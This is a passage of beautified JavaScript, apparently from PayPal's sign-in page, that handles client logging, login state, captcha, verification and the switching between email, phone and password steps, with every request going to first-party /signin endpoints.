                            i && login.logger.log({ evt: "page_lang", data: i.value, instrument: !0 }),
                            login.logger.pushLogs();
                    }
                    function autoLoginfallBackClientLog(e) {
                        var t = login.utils.getSplitLoginContext(),
                            n = window.PAYPAL.ulData || {};
                        (e = e || {}), document.querySelector("body").removeAttribute("data-one-touch-user"), (n.aPayAuth = null), e.error_code && login.logger.log({ evt: "ext_error_code", data: e.error_code, instrument: !0 });
                        if (t) {
                            instrumentSplitLoginPageLoad(t);
                            return;
                        }
                        instrumentUlAsLandingPageLoad();
                    }
                    function isAPaySupported() {
                        var e = navigator.userAgent.match(/Chrome\/([0-9]+)\./i);
                        return window.navigator.vendor === "Google Inc." && "PaymentRequest" in window && navigator.userAgent.match(/Android/i) && e && Number(e[1]) >= 58;
                    }
                    var login = {};
                    (login.logger = (function () {
                        function t(t) {
                            (t.timestamp = Date.now ? Date.now() : new Date().getTime()), e.push(t);
                        }
                        function n(t) {
                            var n,
                                r,
                                i = login.utils.getIntent(),
                                s = login.utils.getFlowId(),
                                o = $("body").data("loginLiteExperience"),
                                u;
                            if (e.length === 0) return;
                            (t = t || {}),
                                e.push({ evt: "context_correlation_id", data: $("body").data("correlationId"), instrument: !0 }),
                                i && (e.push({ evt: "serverside_data_source", data: i, instrument: !0 }), e.push({ evt: "intent", data: i, instrument: !0 })),
                                s && e.push({ evt: "context_id", data: s, instrument: !0 }),
                                o && e.push({ evt: "lite_experience", data: "Y", instrument: !0 }),
                                (n = document.querySelector("#token")),
                                (r = n && n.value),
                                (u = { _csrf: r, currentUrl: window.location.href, logRecords: JSON.stringify(e), intent: i }),
                                typeof t.data == "object" && Object.assign(u, t.data),
                                $.ajax({ url: "/signin/client-log", data: u, success: t.success, fail: t.fail, complete: t.complete }),
                                (e = []);
                        }
                        function r(e, r, i) {
                            e = e || [];
                            if (!(e instanceof Array)) {
                                if (typeof r == "function") return r();
                                return;
                            }
                            for (var s = 0; s < e.length; s++) t(e[s]);
                            var o = {
                                complete: function () {
                                    if (typeof r == "function") return r();
                                },
                            };
                            typeof i == "object" && (o.data = i), n(o);
                        }
                        function i() {
                            var e = login.utils.getSplitLoginContext(),
                                t = document.getElementById("keepMeLoggedIn"),
                                n = t ? "LOGIN_UL_RM" : "LOGIN_UL",
                                r = { inputEmail: "begin_email", implicitEmail: "begin_email", inputPassword: "begin_pwd", inputPhone: "begin_phone" };
                            return e && r[e] && (n = r[e]), n;
                        }
                        function s() {
                            var t,
                                n = document.querySelector('input[name="clientLogRecords"]');
                            if (n)
                                try {
                                    t = JSON.parse(n.value);
                                } catch (r) {}
                            t && (e = e.concat(t));
                        }
                        var e = [];
                        return { log: t, logServerPreparedMetrics: s, pushLogs: n, clientLog: r, getStateName: i };
                    })()),
                        (login.pubsub = (function () {
                            var e = {},
                                t = {};
                            return (
                                (e.publish = function (e, n) {
                                    if (!t[e]) return !1;
                                    var r = t[e],
                                        i = r ? r.length : 0;
                                    while (i > 0) r[i - 1].func(n), (i -= 1);
                                }),
                                (e.subscribe = function (e, n) {
                                    if (typeof n != "function") return;
                                    t[e] || (t[e] = []), t[e].push({ func: n });
                                }),
                                e
                            );
                        })()),
                        (login.store = (function () {
                            return function (t) {
                                function r() {
                                    return n;
                                }
                                function i(e) {
                                    var t = document.querySelector("input[name=splitLoginContext]");
                                    e.splitLoginContext || (e.splitLoginContext = t && t.value);
                                    var r = Object.assign({}, n.model, e);
                                    (r.notifications = e.notifications), (r.tpdAutosend = e.tpdAutosend), (r.showSpinnerUpfront = e.showSpinnerUpfront), (r.enableSmartlock = e.enableSmartlock);
                                    var i = Object.assign({}, n, { model: r });
                                    (n = i), login.pubsub.publish("STATE_UPDATED", i);
                                }
                                var n = t || {};
                                return { updateModel: i, getState: r };
                            };
                        })());
                    var addEvent = function (e, t, n) {
                            if (!e || !t || !n) return;
                            e.addEventListener ? e.addEventListener(t, n, !1) : e.attachEvent && e.attachEvent("on" + t, n);
                        },
                        removeEvent = function (e, t, n) {
                            if (!e || !t || !n) return;
                            e.removeEventListener ? e.removeEventListener(t, n, !1) : e.attachEvent && e.detachEvent("on" + t, n);
                        },
                        createNewEvent = function (e) {
                            if (typeof window.Event == "function") return new Event(e);
                            var t = document.createEvent("Event");
                            return t.initEvent(e, !0, !0), t;
                        },
                        eventPreventDefault = function (e) {
                            var t = e || window.event || {};
                            t.preventDefault ? t.preventDefault() : (t.returnValue = !1);
                        },
                        eventStopPropagation = function (e) {
                            var t = e || window.event || {};
                            t.stopPropagation ? t.stopPropagation() : (t.cancelBubble = !0);
                        },
                        getEventTarget = function (e) {
                            var t = e || window.event || {};
                            return t.target || t.srcElement;
                        },
                        triggerEvent = function (e, t) {
                            if (!e || !t) return;
                            var n = createNewEvent(t);
                            e.dispatchEvent ? e.dispatchEvent(n) : e.fireEvent && e.fireEvent("on" + t, n);
                        },
                        isEnterKeyPressed = function (e) {
                            return e ? (e.key ? e.key === "Enter" : e.which ? e.which === 13 : e.keyCode === 13) : !1;
                        };
                    (login.utils = (function () {
                        function r() {
                            $(e).addClass("spinner"), $(e).removeClass("hide"), e.setAttribute("aria-busy", "true"), t && $(t).removeClass("hide");
                        }
                        function i() {
                            $(e).removeClass("spinner"), $(e).removeClass("nonTransparentMask"), $(e).addClass("hide"), e.setAttribute("aria-busy", "false"), t && $(t).addClass("hide");
                        }
                        function s(e) {
                            var t;
                            if (e !== "") {
                                (t = document.querySelector(".transitioning p." + e)), t && $(t).removeClass("hide");
                                return;
                            }
                            $(n).removeClass("hide");
                        }
                        function o(e) {
                            var t;
                            if (e !== "") {
                                (t = document.querySelector(".transitioning p." + e)), t && $(t).addClass("hide");
                                return;
                            }
                            $(n).addClass("hide");
                        }
                        function u(e, t, n, i) {
                            var s = e && e.getAttribute("href"),
                                o = e && e.getAttribute("id"),
                                u,
                                a,
                                f;
                            return function (l) {
                                l.preventDefault(),
                                    login.logger.log({ evt: "state_name", data: t || login.logger.getStateName(), instrument: !0 }),
                                    login.logger.log({ evt: "transition_name", data: n, instrument: !0 }),
                                    (u = document.querySelector('input[name="locale.x"]')),
                                    u && login.logger.log({ evt: "page_lang", data: u.value, instrument: !0 }),
                                    (a = $(e).data("locale")),
                                    a && login.logger.log({ evt: "change_to_lang", data: a, instrument: !0 }),
                                    (f = {
                                        complete: function () {
                                            if (typeof i == "function") return i();
                                            window.location = s;
                                        },
                                    }),
                                    o === "splitLoginOptOut" && (f = Object.assign({}, f, { data: { splitLoginOptOut: !0 } })),
                                    login.logger.pushLogs(f),
                                    r();
                            };
                        }
                        function a(e, t) {
                            eventPreventDefault(e),
                                $.ajax({
                                    type: "POST",
                                    url: "/signin/not-you",
                                    data: { _csrf: document.querySelector("#token").value, notYou: !0, intent: y(), context_id: b() },
                                    dataType: "json",
                                    success: l,
                                    fail: c,
                                    complete: function () {
                                        if (typeof t == "function") return t();
                                    },
                                });
                        }
                        function f(e) {
                            login.storeInstance && login.storeInstance.updateModel(e), e.ulSync && login.fn.updateFnSyncContext(e.ulSync), !e.showSpinnerUpfront && e.smartlockStatus !== "linked" && i();
                        }
                        function l(e) {
                            if (e && e.htmlResponse) {
                                login.ads.handleAdsInterception(decodeURIComponent(e.htmlResponse));
                                return;
                            }
                            if (e && e.returnUrl && !e.notifications) {
                                window.location.href = e.returnUrl;
                                return;
                            }
                            !e.profile && e.adsChallengeUrl && login.ads.init(e.adsChallengeUrl),
                                f(e),
                                e.verification &&
                                    e.verification.page === "pending" &&
                                    (login.verification.startPolling({ accessToken: e.accessToken, authflowDocumentId: e.authflowDocumentId, _csrf: e._csrf, email: e.verification.email }), login.verification.showResendLink()),
                                k(e),
                                L();
                        }
                        function c(t) {
                            k(t);
                            if (t.status === 429) {
                                $(e).removeClass("spinner");
                                return;
                            }
                            window.location.href = window.location.href;
                        }
                        function h(e) {
                            login.pubsub && login.pubsub.publish("WINDOW_CLICK", e);
                        }
                        function p(e) {
                            var t = document.querySelector(".rememberProfile .bubble-tooltip"),
                                n,
                                r;
                            if (!t || !e || !getEventTarget(e)) return;
                            (n = $(t)), (r = $(getEventTarget(e)));
                            if (r.hasClass("infoLink") || r.hasClass("bubble-tooltip")) {
                                eventPreventDefault(e), n.toggle();
                                return;
                            }
                            n.addClass("hide");
                        }
                        function d(e) {
                            return !!(e && window.chrome && window.chrome.webstore && getComputedStyle(e).backgroundColor === "rgb(250, 255, 189)");
                        }
                        function v(e) {
                            return e ? d(e) || (e.value && e.value.length > 0) : !1;
                        }
                        function m() {
                            return window.self !== window.top;
                        }
                        function g() {
                            var e = document.querySelector('input[name="splitLoginContext"]');
                            return e && e.value;
                        }
                        function y() {
                            var e = document.querySelector('input[name="intent"]');
                            return (e && e.value) || "";
                        }
                        function b() {
                            var e = document.querySelector("input[name=flowId]");
                            return (e && e.value) || "";
                        }
                        function w() {
                            return document.querySelector("#keepMeLoggedIn");
                        }
                        function E() {
                            return window.xchild || (window.name && window.name.indexOf("xcomponent") === 0);
                        }
                        function S(e) {
                            var t,
                                n = document.querySelector('input[name="splitLoginCookiedFallback"]');
                            if (!e || n) return (t = document.querySelector("#captcha")), C(t);
                            switch (e.value) {
                                case "inputEmail":
                                    t = document.querySelector("#splitEmailCaptcha");
                                    break;
                                case "inputPhone":
                                    t = document.querySelector("#splitPhoneCaptcha");
                                    break;
                                case "inputPassword":
                                case "inputPin":
                                    t = document.querySelector("#splitPasswordCaptcha");
                                    break;
                                case "implicitEmail":
                                    t = document.querySelector("#implicitEmailCaptcha");
                                    break;
                                default:
                                    t = null;
                            }
                            return t && $(t).hasClass("hide") ? null : C(t);
                        }
                        function x(e, t) {
                            t = decodeURIComponent(t);
                            var n = t && t.split("?")[1],
                                r = {};
                            if (!n) return;
                            return (
                                n.split("&").forEach(function (e) {
                                    var t = e.split("=");
                                    r[t[0]] = t[1];
                                }),
                                r[e]
                            );
                        }
                        function T(e) {
                            e = decodeURIComponent(e);
                            var t = e && e.split("?")[1],
                                n = {},
                                r,
                                i;
                            if (!t) return;
                            r = t.split("&");
                            for (var s = 0; s < r.length; s++) (i = r[s].split("=")), (n[i[0]] = i[1]);
                            return n;
                        }
                        function N(e, t, n) {
                            var r = login.utils.getQueryParamsObj(e),
                                i,
                                s;
                            return r ? (r[t] !== undefined ? ((i = r[t]), e.replace(t + "=" + i, t + "=" + n)) : e + "&" + t + "=" + n) : e[e.length - 1] === "?" ? e + t + "=" + n : e + "?" + t + "=" + n;
                        }
                        function C(e) {
                            return e
                                ? {
                                      container: e.querySelector("div.textInput"),
                                      field: e.querySelector("input[type=text]"),
                                      errMsgContainer: e.querySelector("div.errorMessage"),
                                      errMsg: e.querySelector("div.errorMessage .emptyError"),
                                      playAudioBtn: e.querySelector(".captchaPlay"),
                                      refreshCaptchaBtn: e.querySelector(".captchaRefresh"),
                                      audioTag: e.querySelector(".audio audio"),
                                      image: e.querySelector(".captcha-image img"),
                                      audioLink: e.querySelector(".audio a"),
                                  }
                                : null;
                        }
                        function k(e) {
                            var t,
                                n = window.PAYPAL && window.PAYPAL.analytics;
                            if (e && e.sys && n && n.endCPLTracking)
                                try {
                                    (t = n.Analytics.prototype.utils.queryStringToObject(e.sys.tracking.fpti.dataString)), n.endCPLTracking(t);
                                } catch (r) {}
                        }
                        function L() {
                            var e = document.querySelector("#splitPassword");
                            e && $(e).addClass("transformRightToLeft");
                        }
                        function A(e, t, n) {
                            var r = document.createElement("input");
                            if (!n) return;
                            r.setAttribute("type", "hidden"), r.setAttribute("name", e), r.setAttribute("value", t), n.appendChild(r);
                        }
                        function O(e) {
                            try {
                                PAYPAL.analytics.instance.recordImpression({ data: e.sys.tracking.fpti.dataString });
                            } catch (t) {}
                        }
                        function M(e) {
                            var t = document.createElement("iframe"),
                                n = ["id", "className", "frameBorder", "sandbox", "src", "style"];
                            if (!e) return;
                            for (var r = 0; r < n.length; r++) e[n[r]] && (t[n[r]] = e[n[r]]);
                            return document.body.appendChild(t), t;
                        }
                        function _(e, t) {
                            var n = document.querySelector(".notifications"),
                                r,
                                i;
                            n && ((r = document.createElement("p")), (i = document.createTextNode(e)), r.setAttribute("class", "notification " + t), r.setAttribute("role", "alert"), r.appendChild(i), n.appendChild(r));
                        }
                        function D() {
                            var e = document.getElementById("token");
                            return (e && e.value) || "";
                        }
                        function P(e) {
                            var t = document.getElementById("token");
                            t && e && (t.value = e);
                        }
                        function H(e, t) {
                            return new Promise(function (n, i) {
                                var s = {};
                                (t = t || {}),
                                    t.data && (s = t.data),
                                    (s._csrf = D()),
                                    r(),
                                    $.ajax({
                                        type: t.method || "POST",
                                        url: e,
                                        data: s,
                                        dataType: "json",
                                        success: function (e) {
                                            return e ? (P(e._csrf), n(e)) : i();
                                        },
                                        fail: function (e) {
                                            return i();
                                        },
                                    });
                            });
                        }
                        function B() {
                            return window.navigator.vendor === "Google Inc." && navigator.userAgent.match(/Android/i);
                        }
                        function j() {
                            var e,
                                t = "/signin/cookie-banner",
                                n = b();
                            n && (t = t + "?flowId=" + n),
                                $.ajax({
                                    method: "GET",
                                    url: t,
                                    success: function (t) {
                                        var n = t && t.data && t.data.cookieBanner,
                                            r,
                                            i = 0;
                                        if (!n) return;
                                        document.querySelector("head").insertAdjacentHTML("beforeend", n.css),
                                            document.querySelector("#main").insertAdjacentHTML("beforeend", n.html),
                                            (e = document.createElement("script")),
                                            e.setAttribute("nonce", $("body").data("nonce")),
                                            (e.innerHTML = n.js.replace(/^<script[^>]*>|<\/script>$/g, "")),
                                            $("body").append(e),
                                            typeof window.bindGdprEvents == "function" && window.bindGdprEvents(),
                                            (r = document.querySelector("#gdprCookieBanner")),
                                            r && ((i = $(r).outerHeight()), (document.querySelector("body").style.marginBottom = i + "px"));
                                    },
                                });
                        }
                        function F() {
                            function o(e) {
                                var t = document.querySelector("#phoneCode"),
                                    n = document.createDocumentFragment(),
                                    r = e && e.countryPhoneList,
                                    i = e && e.phoneCode,
                                    s;
                                if (!r || !r.length || !t) return;
                                for (var o = 0; o < r.length; o++)
                                    (s = document.createElement("option")),
                                        (s.value = r[o].$value),
                                        s.setAttribute("data-code", r[o].$code),
                                        s.setAttribute("data-country", r[o].$country),
                                        (s.textContent = r[o].$elt),
                                        r[o].$value === i && s.setAttribute("selected", "selected"),
                                        n.appendChild(s);
                                (t.innerHTML = ""), t.appendChild(n);
                            }
                            function u() {
                                var e = { lazyload: "countrycodes", "locale.x": t, _csrf: D(), flowId: n };
                                if (i >= s) return;
                                (i += 1), $.ajax({ url: r, method: "POST", data: e, success: o, fail: u });
                            }
                            var e = document.querySelector('input[name="locale.x"]'),
                                t = e && e.value,
                                n = b(),
                                r = "/signin/load-resource",
                                i = 0,
                                s = 2;
                            u();
                        }
                        function I(e) {
                            return e ? ((e = e.replace(/[-()\.\+\s]/gi, "")), !e || e.search(/\D+/g) >= 0) : !0;
                        }
                        var e = document.querySelector(".transitioning"),
                            t = document.querySelector(".lockIcon"),
                            n = document.querySelector(".transitioning p.checkingInfo");
                        return {
                            showSpinner: r,
                            hideSpinner: i,
                            showSpinnerMessage: s,
                            hideSpinnerMessage: o,
                            getOutboundLinksHandler: u,
                            isFieldPrefilled: v,
                            notYouClickHandler: a,
                            successfulXhrHandler: l,
                            failedXhrSubmitHandler: c,
                            documentClickHandler: h,
                            toggleRememberInfoTooltip: p,
                            updateView: f,
                            isInIframe: m,
                            isInContextIntegration: E,
                            getSplitLoginContext: g,
                            getIntent: y,
                            getFlowId: b,
                            getKmliCb: w,
                            getActiveCaptchaElement: S,
                            getCaptchaDom: C,
                            getQueryParamFromUrl: x,
                            setSliderToPasswordContainer: L,
                            getQueryParamsObj: T,
                            updateParamValue: N,
                            addHiddenElement: A,
                            doImpressionTracking: O,
                            createIframe: M,
                            updatePageLevelError: _,
                            makeServerRequestAndReturnPromise: H,
                            getCSRFToken: D,
                            setCSRFToken: P,
                            isAndroidDevice: B,
                            showCookieBanner: j,
                            loadPhoneCountryCodes: F,
                            doesItLookLikeEmail: I,
                        };
                    })()),
                        (function () {
                            var e = function (e) {
                                function t(t) {
                                    return e.classList ? e.classList.contains(t) : !!e.className.match(new RegExp("(\\s|^)" + t + "(\\s|$)"));
                                }
                                function n(n) {
                                    e.classList ? e.classList.add(n) : t(n) || (e.className += " " + n);
                                }
                                function r(n) {
                                    if (e.classList) e.classList.remove(n);
                                    else if (t(n)) {
                                        var r = new RegExp("(\\s|^)" + n + "(\\s|$)");
                                        e.className = e.className.replace(r, " ");
                                    }
                                }
                                function i(t) {
                                    var n;
                                    if (typeof t != "string") return;
                                    return (n = "data-" + t.replace(/([A-Z])/g, "-$1").toLowerCase()), e.getAttribute(n);
                                }
                                function s() {
                                    var t,
                                        n = e.offsetHeight;
                                    return typeof getComputedStyle == "undefined" ? n : ((t = getComputedStyle(e)), (n += parseInt(t.marginTop) + parseInt(t.marginBottom)), n);
                                }
                                function o(t, n) {
                                    return n ? e.setAttribute(t, n) : e.getAttribute(t);
                                }
                                function u(t) {
                                    return e.querySelectorAll(t);
                                }
                                function a(t) {
                                    e.textContent !== undefined && e.textContent !== null ? (e.textContent = t) : (e.innerText = t);
                                }
                                function f() {
                                    e.parentNode.removeChild(e);
                                }
                                function l() {
                                    t("hide") ? r("hide") : n("hide");
                                }
                                function c(t) {
                                    e.appendChild(t);
                                }
                                function h() {
                                    e.focus();
                                }
                                function p(t) {
                                    e.value = t;
                                }
                                typeof e == "string" && (e = document.querySelector(e));
                                if (!e) return;
                                return { hasClass: t, addClass: n, removeClass: r, data: i, outerHeight: s, text: a, attr: o, find: u, remove: f, toggle: l, append: c, focus: h, val: p };
                            };
                            (e.ajax = function (e) {
                                var t,
                                    n,
                                    r,
                                    i = [],
                                    s;
                                if (!e || (e && !e.url)) return;
                                try {
                                    t = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
                                } catch (o) {}
                                if (!t) return;
                                e.method = e.method || "POST";
                                if (e.data && typeof e.data != "string") for (s in e.data) i.push(encodeURIComponent(s) + "=" + encodeURIComponent(e.data[s]));
                                (t.onreadystatechange = function () {
                                    if (t.readyState !== 4) return;
                                    n = t.response || t.responseText;
                                    if (t.status === 200 && n) {
                                        try {
                                            n = JSON.parse(n);
                                        } catch (r) {}
                                        typeof e.success == "function" && e.success(n);
                                    }
                                    t.status !== 200 && typeof e.fail == "function" && e.fail(t), typeof e.complete == "function" && e.complete();
                                }),
                                    t.open(e.method, e.url),
                                    t.setRequestHeader("X-Requested-With", "XMLHttpRequest"),
                                    e.method === "POST" && (t.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), t.setRequestHeader("Accept", "application/json")),
                                    e.method === "GET" && t.setRequestHeader("Accept", "application/json");
                                if (typeof e.headers == "object" && e.headers.length) for (r in e.headers) t.setRequestHeader(r, e.headers[r]);
                                return t.send(i && i.join("&")), t;
                            }),
                                (window.$ = e);
                        })(),
                        (login.view = (function () {
                            function e(e) {
                                var i = document.querySelector("input[name=splitLoginContext]"),
                                    l = $("body").data("isHybridLoginExperience") === "true",
                                    p = (e && e.model) || {};
                                typeof window.showGdprBanner == "function" && window.showGdprBanner(), (i.value = p.splitLoginContext), m(p), c(p), r(p), s(p), o(p), t(p), u(p), a(p), v(p), f(p), h(p), l && n(p);
                            }
                            function t(e) {
                                var t = document.querySelector("#moreOptionsContainer"),
                                    n = document.querySelector('input[name="tpdEligible"]'),
                                    r,
                                    i,
                                    s = document.querySelector("input[name=splitLoginCookiedFallback]"),
                                    o = document.querySelector("input[name=splitLoginContext]");
                                t && e.splitLoginContext === "inputEmail" && ($(t).addClass("hide"), s && s.value === "true" && o && (o.value = "inputPassword"), n && n.value === "true" && (n.value = "")),
                                    t &&
                                        e.splitLoginContext === "inputPassword" &&
                                        e.moreOptions === !0 &&
                                        (e.tpdAutosend || ($("#moreOptionsContainer").removeClass("hide"), $(".forgotLink").addClass("hide")),
                                        n
                                            ? (n.value = "true")
                                            : ((i = document.querySelector("form[name=login]")),
                                              (r = document.createElement("input")),
                                              r.setAttribute("type", "hidden"),
                                              r.setAttribute("name", "tpdEligible"),
                                              r.setAttribute("value", "true"),
                                              $(i).append(r))),
                                    e.tpdAutosend && (login.tpdLogin && login.tpdLogin.instrumentTpdLoginAutoTriggered(), login.tpdLogin && login.tpdLogin.attemptTpdLogin("tpdAutoSend"));
                            }
                            function n(e) {
                                var t = document.querySelector("#email"),
                                    n = document.querySelector("#phone"),
                                    r = document.querySelector("#emailOrPhone"),
                                    i = document.querySelector(".countryPhoneSelectWrapper"),
                                    s = document.querySelector("#emailOrPhonediv"),
                                    o = document.querySelector(".profileRememberedEmail");
                                t && t.removeAttribute("disabled"),
                                    n && n.removeAttribute("disabled"),
                                    r && ((r.value = null), r.blur()),
                                    i && $(i).addClass("hide"),
                                    s && $(s).removeClass("phoneInputWrapper"),
                                    !e.profile && o && $(o).removeClass("cookiedProfile");
                            }
                            function r(e) {
                                var t = document.querySelector("#splitEmail"),
                                    n = document.querySelector("#splitEmailSection"),
                                    r = document.querySelector("#splitPhoneSection"),
                                    i = document.querySelector("#rememberProfileEmail"),
                                    s = document.querySelector("#email"),
                                    o = document.querySelector("#phone"),
                                    u = document.querySelector(".forgotLink"),
                                    a = document.querySelector(".forgotLink .bubble-tooltip"),
                                    f = document.querySelector(".actions"),
                                    l = document.querySelector("#loginWithPhoneOption"),
                                    c = document.querySelector("#loginWithEmailOption"),
                                    h = $("body").data("phonePasswordEnabled"),
                                    d = $("body").data("phonePinEnabled");
                                e.splitLoginContext === "inputEmail" || e.splitLoginContext === "inputPhone"
                                    ? (t && $(t).removeClass("hide"), i && typeof e.rememberProfile != "undefined" && (i.checked = e.rememberProfile === "true" || e.rememberProfile === !0), p())
                                    : (e.tpdAutosend || (t && $(t).addClass("hide")), o && o.blur(), s && s.blur()),
                                    n &&
                                        e.splitLoginContext === "inputEmail" &&
                                        ($(n).removeClass("hide"),
                                        s.removeAttribute("disabled"),
                                        d || h
                                            ? (l && $(l).removeClass("hide"), c && $(c).addClass("hide"), u && $(u).addClass("hide"), a && $(a).addClass("hide"))
                                            : e.hidePwrOnEmailPage
                                            ? (u && $(u).addClass("hide"), a && $(a).addClass("hide"))
                                            : u && $(u).removeClass("hide"),
                                        $(f).removeClass("phonePresent"),
                                        r && $(r).addClass("hide"),
                                        o && ((o.value = ""), o.setAttribute("disabled", "disabled")));
                                if (r && e.splitLoginContext === "inputPhone") {
                                    n && $(n).addClass("hide"), $(r).removeClass("hide");
                                    if (d || h) l && $(l).addClass("hide"), c && $(c).removeClass("hide");
                                }
                            }
                            function i(e) {
                                if (!e.enableSmartlock) return;
                                login.smartLock(e);
                            }
                            function s(e) {
                                var t = document.querySelector(".educationMessage");
                                e.showEducationMessage === !0 && e.splitLoginContext === "inputPin" ? t && $(t).removeClass("hide") : t && $(t).addClass("hide");
                            }
                            function o(e) {
                                var t = document.querySelector("#splitPassword"),
                                    n = document.querySelector("#splitPasswordSection"),
                                    r = document.querySelector("#splitPinSection"),
                                    s = document.querySelector("#password"),
                                    o = document.querySelector("#pin"),
                                    u = document.querySelector("#rememberProfilePassword"),
                                    a = document.querySelector(".forgotLink"),
                                    f = document.querySelector("#phone"),
                                    l = document.querySelector('#splitEmail input[type="password"]');
                                l && l.value.trim() && ((s.value = l.value), (l.value = "")),
                                    e.splitLoginContext === "inputPassword" || e.splitLoginContext === "inputPin"
                                        ? (t && !e.tpdAutosend && $(t).removeClass("hide"),
                                          i(e),
                                          u && (u.checked = e.rememberProfile === "true" || e.rememberProfile === !0),
                                          e.splitLoginContext === "inputPassword" && !e.moreOptions && a && $(a).removeClass("hide"),
                                          $(s).attr("disabled") === "disabled" && s.removeAttribute("disabled"),
                                          e.smartlockStatus !== "linked" && !e.verification && d(e))
                                        : (t && $(t).addClass("hide"), (s.value = ""), o && (o.value = "")),
                                    n && e.splitLoginContext === "inputPassword" && (r && $(r).addClass("hide"), $(n).removeClass("hide")),
                                    r && e.splitLoginContext === "inputPin" && ($(n).addClass("hide"), $(r).removeClass("hide")),
                                    e.profile && e.profile.phone && (f.value = e.profile.phone),
                                    $("body").hasClass("desktop") && s.focus();
                            }
                            function u(e) {
                                var t = document.querySelector("input[name=splitLoginContext]"),
                                    n = document.querySelector(".profileDisplayEmail"),
                                    r = document.querySelector(".profileDisplayName"),
                                    i = document.querySelector(".profileRememberedEmail"),
                                    s = document.querySelector(".profileIcon"),
                                    o = document.querySelector("#email"),
                                    u = document.querySelector(".profileDisplayPhoneCode"),
                                    a;
                                if (e.tpdAutosend) return;
                                if (!e.profile) {
                                    s && ($(s).addClass("hide"), $(s).text(""), s.removeAttribute("style"), $(s).removeClass("profilePhoto"), $(s).removeClass("profileInitials"), $(s).addClass("profilePlaceHolderImg")),
                                        n && $(n).text(""),
                                        u && $(u).text(""),
                                        r && $(r).addClass("hide"),
                                        (o.value = ""),
                                        i && $(i).addClass("hide"),
                                        window.dispatchEvent && window.dispatchEvent(createNewEvent("resize"));
                                    return;
                                }
                                (a = e.profile.phone || e.profile.email),
                                    a && e.splitLoginContext !== "inputEmail" && e.splitLoginContext !== "inputPhone" && (n && $(n).text(a), i && $(i).removeClass("hide")),
                                    e.profile.phoneCode && u && $(u).text(e.profile.phoneCode);
                            }
                            function a(e) {
                                function t(e, t) {
                                    var n = login.utils.getQueryParamFromUrl("ulPage", e);
                                    return n ? login.utils.updateParamValue(e, "ulPage", t) : e;
                                }
                                var n = $(document.querySelector("#signupContainer")),
                                    r = e.splitLoginContext === "inputEmail" || e.splitLoginContext === "inputPhone",
                                    i,
                                    s,
                                    o,
                                    u;
                                if (!n) return;
                                (o = $(signupContainer.querySelector("#createAccount"))),
                                    (i = n.data("hideOnEmail") === "true"),
                                    (s = n.data("hideOnPass") === "true"),
                                    (u = o && o.attr("href")),
                                    r ? (i ? n.addClass("hide") : n.removeClass("hide"), o && o.attr("href", t(u, "email"))) : (s ? n.addClass("hide") : n.removeClass("hide"), o && o.attr("href", t(u, "pwd")));
                            }
                            function f(e) {
                                var t = document.querySelector("footer"),
                                    n = document.querySelector("#login"),
                                    r = document.querySelector("#login .contentContainer"),
                                    i = document.querySelector("#verification .contentContainer"),
                                    s = document.querySelector("#verification"),
                                    o;
                                e.verification
                                    ? ((o = document.querySelector(".activeContent")),
                                      $(n).addClass("hide"),
                                      $(s) && $(s).removeClass("hide"),
                                      $(t).addClass("footerWithIcon"),
                                      $(o).removeClass("activeContent"),
                                      $(i) && $(i).addClass("activeContent"),
                                      l(e.verification),
                                      login.tpdLogin && login.tpdLogin.instrumentVerificationViewRendered())
                                    : ((o = document.querySelector(".activeContent")),
                                      $(n).removeClass("hide"),
                                      $(s) && $(s).addClass("hide"),
                                      $(t).removeClass("footerWithIcon"),
                                      $(o).removeClass("activeContent"),
                                      $(r).addClass("activeContent"));
                            }
                            function l(e) {
                                if (!e) return;
                                var t = document.querySelector(".account"),
                                    n = document.querySelector(".mobileNotification .pin");
                                $(t).text(e.email), e.pin && n && $(n).text(e.pin);
                            }
                            function c(e) {
                                var t = document.querySelectorAll(".notifications");
                                for (var n = 0; n < t.length; n++)
                                    $(t[n]).text(""), e.notifications && e.notifications.msg && (t[n].innerHTML = '<p class="notification ' + e.notifications.type + '" role="alert">' + e.notifications.msg + "</p>");
                            }
                            function h(e) {
                                var t = document.querySelector("#emailSubTagLine"),
                                    n = document.querySelector("#phoneSubTagLine"),
                                    r = document.querySelector("#pwdSubTagLine");
                                e.splitLoginContext === "inputPassword" || e.splitLoginContext === "inputPin"
                                    ? (t && $(t).addClass("hide"), n && $(n).addClass("hide"), r && $(r).removeClass("hide"))
                                    : e.splitLoginContext === "inputPhone"
                                    ? (n && $(n).removeClass("hide"), t && $(t).addClass("hide"), r && $(r).addClass("hide"))
                                    : (t && $(t).removeClass("hide"), n && $(n).addClass("hide"), r && $(r).addClass("hide"));
                            }
                            function p() {
                                login.logger.log({ evt: "state_name", data: "begin_email", instrument: !0 }),
                                    login.logger.log({ evt: "transition_name", data: "prepare_email", instrument: !0 }),
                                    login.logger.log({ evt: "is_cookied", data: "N", instrument: !0 }),
                                    login.logger.pushLogs();
                            }
                            function d(e) {
                                var t = document.querySelector("#password"),
                                    n = login.utils.isFieldPrefilled(t),
                                    r = "prepare_pwd" + (login.utils.getKmliCb() ? "_ot" : "");
                                document.querySelector("#moreOptionsContainer") && e.moreOptions === !0 && ((r += "_more_opt"), login.logger.log({ evt: "exp_shown", data: "tpd", instrument: !0 })),
                                    login.logger.log({ evt: "state_name", data: "begin_pwd", instrument: !0 }),
                                    login.logger.log({ evt: "transition_name", data: r, instrument: !0 }),
                                    login.logger.log({ evt: "is_cookied", data: "Y", instrument: !0 }),
                                    login.logger.log({ evt: "autofill", data: n ? "Y" : "N", instrument: !0 }),
                                    login.logger.pushLogs();
                            }
                            function v(e) {
                                function n(e) {
                                    var t = document.querySelectorAll(".captcha-container");
                                    for (var n = 0; n < t.length; n++) e ? $(t[n]).removeClass("hide") : $(t[n]).addClass("hide");
                                }
                                var t;
                                n(e.captcha);
                                if (!e.captcha) return;
                                t = login.utils.getActiveCaptchaElement({ value: e.splitLoginContext });
                                if (!t) return;
                                e.captcha.captchaImgUrl && t.image && t.image.setAttribute("src", e.captcha.captchaImgUrl),
                                    e.captcha.captchaAudioUrl && t.audioTag && t.audioTag.setAttribute("src", e.captcha.captchaAudioUrl),
                                    e.captcha.captchaAudioUrl && t.audioLink && t.audioLink.setAttribute("href", e.captcha.captchaAudioUrl);
                            }
                            function m(e) {
                                if (!e.adsChallengeVerified) return;
                                $("#login").removeClass("hide"), document.getElementById("ads-container") && (document.getElementById("ads-container").style.display = "none");
                            }
                            return (login.storeInstance = login.store()), login.pubsub.subscribe("STATE_UPDATED", e), { render: e, updateNotificationView: c };
                        })()),
                        (function () {
